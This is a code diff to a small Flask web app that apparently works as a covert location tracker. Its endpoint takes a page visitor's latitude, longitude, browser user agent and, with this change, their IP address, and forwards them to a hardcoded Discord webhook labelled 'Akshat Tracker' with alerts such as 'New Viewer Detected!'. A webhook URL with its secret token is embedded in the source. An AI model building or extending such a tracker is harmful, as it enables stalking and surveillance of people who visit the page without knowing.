@@ -1,50 +1,44 @@
 from flask import Flask, request, send_from_directory, jsonify
 import requests
-from datetime import datetime
 import os
 
 app = Flask(__name__)
 
-os.makedirs('static', exist_ok=True)
-
-# Your Discord Webhook
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1521185686709862623/IT5aYe_AA002gG5AwQ6Qrg_8ctPm-Q87gr6vhLtajqkoTP_rxi_Tn5U9I0I-JHRRYyTu"
 
 @app.route('/')
 def index():
-    return open('index.html', 'r').read()
+    with open('index.html', 'r') as f:
+        return f.read()
 
 @app.route('/capture-location', methods=['POST'])
 def capture_location():
-    data = request.json
-    lat = data.get('latitude')
-    lon = data.get('longitude')
-    timestamp = data.get('timestamp')
-    
-    location_info = f"""
-**🔔 New Viewer Detected!**
+    try:
+        data = request.get_json()
+        lat = data.get('latitude')
+        lon = data.get('longitude')
+        
+        location_info = f"""
+**🔔 New Location Captured!**
 
-**Time:** {timestamp}
+**Time:** {data.get('timestamp')}
 **Latitude:** {lat}
 **Longitude:** {lon}
+**Maps:** https://www.google.com/maps?q={lat},{lon}
+**IP Info:** {request.remote_addr}
+**User-Agent:** {data.get('userAgent')}
+        """
 
-**📍 Google Maps:** https://www.google.com/maps?q={lat},{lon}
-
-**Browser:** {data.get('userAgent')}
-"""
-
-    try:
         payload = {
             "content": location_info,
-            "username": "Akshat Tracker",
-            "avatar_url": "https://i.imgur.com/0jAV3.png"
+            "username": "Akshat Tracker"
         }
         requests.post(DISCORD_WEBHOOK_URL, json=payload)
-        print("✅ Location sent to Discord")
+        print("✅ Location sent successfully")
+        return jsonify({"status": "success"})
     except Exception as e:
-        print("❌ Discord error:", e)
-
-    return jsonify({"status": "ok"})
+        print("❌ Error:", e)
+        return jsonify({"status": "error"}), 500
 
 @app.route('/static/<path:filename>')
 def static_files(filename):
